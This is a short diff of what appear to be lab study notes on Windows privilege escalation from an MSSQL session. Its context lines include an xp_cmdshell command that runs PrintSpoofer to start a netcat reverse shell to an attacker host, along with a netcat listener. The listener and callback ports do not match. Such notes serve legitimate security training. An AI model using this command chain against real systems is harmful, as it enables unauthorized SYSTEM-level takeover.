@@ -303,8 +303,11 @@ mssqlclient.py and PrintSpoofer.exe
 JuicyPotato doesn't work on Windows Server 2019 and Windows 10 build 1809 onwards. 
 However, PrintSpoofer and RoguePotato can be used to leverage the same privileges and gain NT AUTHORITY\SYSTEM level access.
 
-#mssqlclient.py sql_dev@10.129.43.30 -windows-auth
+#mssqlclient.py sql_dev@10.129.43.30 -windows-auth   ////in this session if xp_cmdshell cannot be use because of the permisssion
+														(SQL> SELECT name FROM master.dbo.sysdatabases)
+                
 SQL> xp_cmdshell c:\tools\PrintSpoofer.exe -c "c:\tools\nc.exe 10.10.14.3 8443 -e cmd"
+
 
 In kali >  nc -lvnp 1233
 
